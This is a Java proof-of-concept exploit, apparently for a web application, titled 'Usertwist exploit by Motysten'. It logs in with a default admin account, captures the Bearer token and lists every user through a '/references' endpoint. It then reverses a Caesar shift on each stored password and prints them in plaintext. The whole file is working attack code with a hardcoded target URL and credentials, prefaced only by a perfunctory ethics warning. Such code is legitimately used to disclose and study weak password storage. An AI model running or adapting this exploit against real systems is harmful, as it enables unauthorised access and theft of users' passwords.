package fr.motysten.usertwist.exploit;

import fr.motysten.usertwist.exploit.tools.Cesar;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class Main {

    public static String link = "https://poc.athelas.fr";
    public static String username = "admin";
    public static String password = "AdminSecret1C";

    public static void main(String[] args) throws IOException, InterruptedException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));

        System.out.println("Usertwist exploit by Motysten");
        System.out.println("Please don't use for unethical purpose !\n");
        String readLine;

        System.out.println("Please enter the URL to attack (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {link = readLine;}

        System.out.println("Please enter the used username (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {username = readLine;}

        System.out.println("Please enter the password (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {password = readLine;}

        HttpClient client = HttpClient.newHttpClient();

        JSONObject requestJSON = new JSONObject();
        requestJSON.put("username", username);
        requestJSON.put("password", password);

        System.out.println("Gathering Bearer token...");

        HttpRequest request = HttpRequest.newBuilder(URI.create(link + "/login"))
                .POST(HttpRequest.BodyPublishers.ofString(requestJSON.toString()))
                .build();

        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
        JSONObject responseObject = new JSONObject(response.body());
        String token = responseObject.optString("token");

        System.out.println("Token found: " + token);

        requestJSON = new JSONObject();
        requestJSON.put("term", "");
        requestJSON.put("entity", "users");

        System.out.println("\nScanning for existing users...");

        request = HttpRequest.newBuilder(URI.create(link + "/references"))
                .POST(HttpRequest.BodyPublishers.ofString(requestJSON.toString()))
                .setHeader("Authorization", "Bearer " + token)
                .build();

        response = client.send(request, HttpResponse.BodyHandlers.ofString());
        JSONArray usersArray = new JSONArray(response.body());

        System.out.println(usersArray.length() + " users found !");
        System.out.println("\nDecrypting passwords...\n");

        for (int i = 0; i < usersArray.length(); i++) {
            JSONObject user = usersArray.getJSONObject(i);
            String login = user.getString("username");
            String password = Cesar.cesarRotate(user.getString("data"), -4);

            System.out.println((i + 1) + ". " + login + " => " + password);
        }
    }

}
